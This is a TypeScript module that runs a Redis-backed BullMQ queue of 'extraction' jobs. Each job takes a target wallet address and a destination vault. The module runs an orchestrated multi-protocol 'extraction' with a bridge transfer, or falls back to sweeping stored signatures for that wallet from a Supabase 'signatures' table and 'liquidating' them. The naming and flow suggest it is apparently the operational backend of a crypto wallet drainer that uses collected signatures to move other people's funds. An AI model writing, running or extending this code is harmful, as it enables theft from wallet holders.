/**
 * Extraction job plane — BullMQ queue bound to `REDIS_URL` with in-memory fallback when Redis is down.
 * Phase 3: Now integrated with orchestration layer for multi-protocol extraction
 */
import { executeAutonomousLiquidation, executeFullOrchestration } from '@legion/core'
import { notifyError } from './telegram.js'
import {
  createResilientRedisClient,
  enqueueMemoryFallbackJob,
  getRedisWrapperState,
  memoryFallbackJobCount,
  probeRedisWithRetry,
  resolveEffectiveRedisUrl,
  warnRedisDegraded,
  type MemoryJobRecord,
  type RedisPingClient,
} from '@legion/core/lib/redis-wrapper'
import { createClient } from '@supabase/supabase-js'
import IoRedis from 'ioredis'
import { Queue, QueueEvents, Worker, type ConnectionOptions, type Job, type JobsOptions } from 'bullmq'

import { registerWorkerDlqHandlers } from './bullmq-dlq.js'

type RedisClient = RedisPingClient & {
  duplicate(): RedisClient
}

const RedisCtor = IoRedis as unknown as new (
  url: string,
  options?: Record<string, unknown>,
) => RedisClient

let extractionQueue: Queue | null = null
let extractionWorker: Worker | null = null
let extractionEvents: QueueEvents | null = null
let redisInitPromise: Promise<boolean> | null = null
let redisOperational = false

function buildRedisConnection(forBullMq = true): ConnectionOptions {
  const url = resolveEffectiveRedisUrl()
  return createResilientRedisClient(RedisCtor, url, forBullMq) as unknown as ConnectionOptions
}

async function ensureRedisOperational(): Promise<boolean> {
  if (redisInitPromise) return redisInitPromise
  redisInitPromise = (async () => {
    const url = resolveEffectiveRedisUrl()
    if (!url) {
      warnRedisDegraded('REDIS_URL unset')
      redisOperational = false
      return false
    }
    redisOperational = await probeRedisWithRetry(RedisCtor, url)
    return redisOperational
  })()
  return redisInitPromise
}

function attachWorkerErrorHandlers(worker: Worker, events: QueueEvents): void {
  worker.on('error', (err: Error) => {
    console.warn(`BULLMQ_WORKER_ERROR: ${err.message}`)
  })
  events.on('error', (err: Error) => {
    console.warn(`BULLMQ_EVENTS_ERROR: ${err.message}`)
  })
}

function centralHubVaultUrl(): string | null {
  const u =
    process.env['NEXT_PUBLIC_SUPABASE_URL']?.trim() || process.env['SUPABASE_URL']?.trim() || ''
  return u || null
}

type SignatureVaultRow = {
  wallet_address: string
  token_address: string
  signature_hex: string
  scout_value_usd: string | null
  chain_id: string | null
  protocol: string | null
}

function normalizeWalletForAnchors(wallet: string): string {
  const w = wallet.trim()
  return /^0x[0-9a-fA-F]{40}$/i.test(w) ? w.toLowerCase() : w
}

function ctxFromSignatureRow(r: SignatureVaultRow) {
  const scout = Number(r.scout_value_usd ?? '0')
  return {
    wallet_address: r.wallet_address,
    token_address: r.token_address,
    signature_hex: r.signature_hex,
    protocol: typeof r.protocol === 'string' && r.protocol.trim() !== '' ? r.protocol.trim() : 'evm',
    chain_id:
      r.chain_id != null && String(r.chain_id).trim() !== '' ? String(r.chain_id).trim() : null,
    scout_value_usd: Number.isFinite(scout) ? scout : 0,
  }
}

async function sweepSovereignSignaturesForWallet(
  walletNormalized: string,
): Promise<{ rows_processed: number; errors: string[] }> {
  const url = centralHubVaultUrl()
  const serviceKey = process.env['SUPABASE_SERVICE_ROLE_KEY']?.trim()
  const errors: string[] = []
  if (!url || !serviceKey) {
    return { rows_processed: 0, errors: ['SUPABASE_CREDENTIAL_GATE_CLOSED'] }
  }

  const sb = createClient(url, serviceKey)
  const { data: rows, error } = await sb
    .from('signatures')
    .select('wallet_address, token_address, signature_hex, scout_value_usd, chain_id, protocol')
    .eq('wallet_address', walletNormalized)

  if (error) {
    errors.push(error.message)
    return { rows_processed: 0, errors }
  }

  let rows_processed = 0
  for (const r of (rows ?? []) as SignatureVaultRow[]) {
    try {
      await executeAutonomousLiquidation(ctxFromSignatureRow(r))
      rows_processed++
    } catch (e) {
      errors.push(e instanceof Error ? e.message : String(e))
    }
  }

  return { rows_processed, errors }
}

async function processExtractionJobData(
  jobData: Record<string, unknown>,
  jobMeta: { id?: string | number; name?: string },
): Promise<Record<string, unknown>> {
  const rawWallet =
    typeof jobData['wallet_address'] === 'string' ? jobData['wallet_address'].trim() : ''
  if (!rawWallet) {
    return {
      status: 'rejected',
      job_id: String(jobMeta.id ?? ''),
      kind: String(jobMeta.name ?? 'extraction'),
      error: 'wallet_address required',
      processed_at: new Date().toISOString(),
    }
  }
  const wallet_normalized = normalizeWalletForAnchors(rawWallet)

  const jobScoutRaw =
    typeof jobData['scout_value_usd'] === 'string' ? jobData['scout_value_usd'] : ''
  const jobScout = Number(jobScoutRaw || '0')
  const chain =
    typeof jobData['chain'] === 'string' && jobData['chain'].trim() !== ''
      ? jobData['chain'].trim()
      : 'ethereum'

  const vaultAddress =
    (typeof jobData['vault_address'] === 'string' ? jobData['vault_address'].trim() : null) ||
    process.env['VAULT_ADDRESS_EVM'] ||
    process.env['SOVEREIGN_VAULT_EVM'] ||
    null

  if (!vaultAddress) {
    return {
      status: 'rejected',
      job_id: String(jobMeta.id ?? ''),
      kind: String(jobMeta.name ?? 'extraction'),
      error: 'vault_address required (set VAULT_ADDRESS_EVM or pass in job data)',
      processed_at: new Date().toISOString(),
    }
  }

  const fallbackCtx = {
    wallet_address: wallet_normalized,
    protocol:
      typeof jobData['protocol'] === 'string' && jobData['protocol'].trim() !== ''
        ? jobData['protocol'].trim()
        : 'evm',
    chain_id:
      jobData['chain_id'] != null && String(jobData['chain_id']).trim() !== ''
        ? String(jobData['chain_id']).trim()
        : null,
    scout_value_usd: Number.isFinite(jobScout) ? jobScout : 0,
    ...(typeof jobData['token_address'] === 'string' && jobData['token_address'].trim() !== ''
      ? { token_address: jobData['token_address'].trim() }
      : {}),
  }

  // Phase 3: Try orchestrated extraction first (multi-protocol)
  try {
    const orchestrationResult = await executeFullOrchestration(
      wallet_normalized as any,
      vaultAddress as any,
      chain,
    )

    return {
      status: 'processed',
      job_id: String(jobMeta.id ?? ''),
      kind: 'extraction_orchestrated',
      wallet_address: rawWallet,
      positions_detected: orchestrationResult.totalPositionsDetected,
      positions_extracted: orchestrationResult.totalExtracted,
      positions_failed: orchestrationResult.totalFailed,
      extraction_status: orchestrationResult.status,
      extracted_positions: orchestrationResult.positions,
      bridge_transfer: orchestrationResult.bridgeTransfer,
      total_value_extracted: orchestrationResult.totalValueExtracted,
      execution_time_ms: orchestrationResult.executionTimeMs,
      processed_at: new Date().toISOString(),
    }
  } catch (error) {
    console.warn(`[ORCHESTRATION_FALLBACK] ${error instanceof Error ? error.message : String(error)}`)

    // Fallback: Use legacy autonomous liquidation
    const sweep = await sweepSovereignSignaturesForWallet(wallet_normalized)

    let syntheticDispatched = false
    if (sweep.rows_processed === 0) {
      await executeAutonomousLiquidation(fallbackCtx)
      syntheticDispatched = true
    }

    return {
      status: 'processed',
      job_id: String(jobMeta.id ?? ''),
      kind: 'extraction_legacy',
      wallet_address: rawWallet,
      rows_processed: sweep.rows_processed,
      synthetic_dispatcher_lane: syntheticDispatched,
      sweep_faults: sweep.errors,
      fallback_reason: error instanceof Error ? error.message : String(error),
      processed_at: new Date().toISOString(),
    }
  }
}

/** Process extraction job inline when Redis/BullMQ is unavailable (non-durable). */
export async function processExtractionJobInline(
  jobData: Record<string, unknown>,
  jobMeta: { id?: string | number; name?: string },
): Promise<Record<string, unknown>> {
  return processExtractionJobData(jobData, jobMeta)
}

export async function getExtractionQueue(): Promise<Queue | null> {
  const ok = await ensureRedisOperational()
  if (!ok) return null
  if (!extractionQueue) {
    extractionQueue = new Queue('extraction', {
      connection: buildRedisConnection(true),
    })
  }
  return extractionQueue
}

export async function ensureExtractionWorkerInitialized(): Promise<Worker | null> {
  const ok = await ensureRedisOperational()
  if (!ok) {
    console.warn(
      'BULLMQ_WORKER_SKIPPED: Redis unavailable — worker not started (API continues).',
    )
    return null
  }
  if (!extractionWorker) {
    extractionWorker = new Worker(
      'extraction',
      async (job: Job) => processExtractionJobData(job.data as Record<string, unknown>, job),
      { connection: buildRedisConnection(true) },
    )
    extractionEvents = new QueueEvents('extraction', {
      connection: buildRedisConnection(true),
    })
    attachWorkerErrorHandlers(extractionWorker, extractionEvents)
    registerWorkerDlqHandlers(extractionWorker, 'extraction')
  }
  return extractionWorker
}

export type EnqueueExtractionResult =
  | { mode: 'redis'; job_id: string | number | undefined }
  | { mode: 'memory'; job_id: string; warning: string }

function isProductionNodeEnv(): boolean {
  return process.env['NODE_ENV']?.trim().toLowerCase() === 'production'
}

export async function enqueueExtractionJob(
  name: string,
  payload: Record<string, unknown>,
  opts: JobsOptions = { removeOnComplete: 50, removeOnFail: 50 },
): Promise<EnqueueExtractionResult> {
  const queue = await getExtractionQueue()
  if (queue) {
    try {
      const job = await queue.add(name, payload, opts)
      return { mode: 'redis', job_id: job.id }
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      if (isProductionNodeEnv()) {
        throw new Error(`REDIS_ENQUEUE_FAILED: ${detail}`)
      }
      console.warn(`REDIS_ENQUEUE_FAILED: ${detail} — using memory fallback`)
    }
  }

  if (isProductionNodeEnv()) {
    throw new Error(
      'EXTRACTION_QUEUE_UNAVAILABLE: Redis extraction queue is required in production (no memory fallback)',
    )
  }

  const mem = enqueueMemoryFallbackJob(name, payload, opts as Record<string, unknown>)
  console.warn(
    `EXTRACTION_MEMORY_FALLBACK: job ${mem.id} — processing inline (non-durable; start Redis for BullMQ)`,
  )
  void processExtractionJobInline(payload, { id: mem.id, name }).catch((err) => {
    const detail = err instanceof Error ? err.message : String(err)
    console.warn(`EXTRACTION_MEMORY_PROCESS_FAILED: ${detail}`)
    void notifyError('extraction_job_inline', detail, typeof payload['wallet_address'] === 'string' ? payload['wallet_address'] : undefined).catch(() => {})
  })
  return {
    mode: 'memory',
    job_id: mem.id,
    warning: 'Job processed inline in-memory (non-durable); start Redis for BullMQ durability',
  }
}

export function getExtractionQueueState(): {
  redis_state: ReturnType<typeof getRedisWrapperState>
  redis_operational: boolean
  memory_pending: number
} {
  return {
    redis_state: getRedisWrapperState(),
    redis_operational: redisOperational,
    memory_pending: memoryFallbackJobCount(),
  }
}

export async function enqueueMockExtractionJob(
  payload: Record<string, unknown>,
  opts: JobsOptions = { removeOnComplete: 50, removeOnFail: 50 },
): Promise<EnqueueExtractionResult> {
  return enqueueExtractionJob('extraction', payload, opts)
}

export type ExtractionQueueJobCounts = {
  waiting: number
  active: number
  delayed: number
  failed: number
  pending: number
}

/** BullMQ job counts for Telegram /status and ops dashboards. */
export async function getExtractionQueueJobCounts(): Promise<ExtractionQueueJobCounts | null> {
  const queue = await getExtractionQueue()
  if (!queue) return null
  try {
    const counts = await queue.getJobCounts('waiting', 'active', 'delayed', 'failed')
    const waiting = counts.waiting ?? 0
    const active = counts.active ?? 0
    const delayed = counts.delayed ?? 0
    const failed = counts.failed ?? 0
    return {
      waiting,
      active,
      delayed,
      failed,
      pending: waiting + active + delayed,
    }
  } catch {
    return null
  }
}

/** @deprecated Use enqueueExtractionJob — kept for compatibility. */
export type MemoryFallbackJob = MemoryJobRecord
